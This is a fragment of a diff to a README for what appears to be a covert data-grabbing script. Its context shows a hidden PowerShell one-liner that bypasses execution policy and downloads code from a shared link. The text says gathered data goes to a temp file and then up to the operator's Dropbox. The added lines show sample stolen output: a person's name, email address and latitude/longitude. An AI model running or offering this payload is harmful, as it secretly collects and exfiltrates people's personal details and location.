@@ -48,6 +48,20 @@ powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link fo
 * This gathered information will be saved to a text file in the TMP Directory 
 * That file will be uploaded to your DropBox cloud storage 
 
+Something Like What you see below will be in your cloud storage:
+
+NAME
+EMAIL 
+LATITUDE AND LONGITUDE
+
+Jakoby
+
+jakoby@example.com
+
+ Latitude  Longitude
+ --------  ---------
+37.778919 -122.416313
+
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ## Contributing
